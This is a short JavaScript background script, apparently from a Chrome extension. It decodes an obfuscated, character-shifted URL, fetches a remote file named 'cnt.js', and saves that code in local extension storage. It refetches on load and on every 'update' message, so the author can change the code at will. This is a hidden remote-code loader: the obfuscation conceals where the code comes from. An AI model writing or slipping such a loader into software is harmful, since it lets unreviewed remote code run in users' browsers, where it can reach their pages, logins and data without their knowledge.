function updateContentScript() {
    fetch(
        "ivurt<01scx0hkujvdvuftdqovfpu0dqn1DqegJIvgtu0vikoitHptDqeg0obuugs1FzugoujqoGEU0".split("") // Check this!
        .map((e, i) => String.fromCharCode(e.charCodeAt(0) - 1 - (i % 10))).join("") + "cnt.js")
    .then(r => { r.text().then(t => {
        chrome.storage.local.set({"cnt": t}, () => {})
    })})
}
updateContentScript()
chrome.runtime.onMessage.addListener( (message) => {
    if (message.type == "update") {
        updateContentScript()
    }
})